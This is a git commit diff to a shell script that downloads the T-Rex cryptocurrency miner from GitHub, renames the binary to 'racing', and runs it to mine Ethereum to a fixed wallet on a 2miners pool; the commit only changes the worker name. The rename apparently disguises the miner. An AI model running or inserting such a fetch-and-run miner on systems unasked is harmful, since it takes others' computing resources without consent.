0c2dd72abd759db749e8eab007e65da6ba2d6f6b
eah2k98 <106511401+eah2k98@users.noreply.github.com>
2022-06-14 08:17:53 +0700

    Update ctcong.sh

--- ctcong.sh
+++ ctcong.sh
@@ -12,4 +12,4 @@ sudo apt-get install libcurl3 -y
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x543db6d96e8b34984b40cd2de48489f71d40f38f -p x -w thinhoangngulon
+/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x543db6d96e8b34984b40cd2de48489f71d40f38f -p x -w kong_cu_to
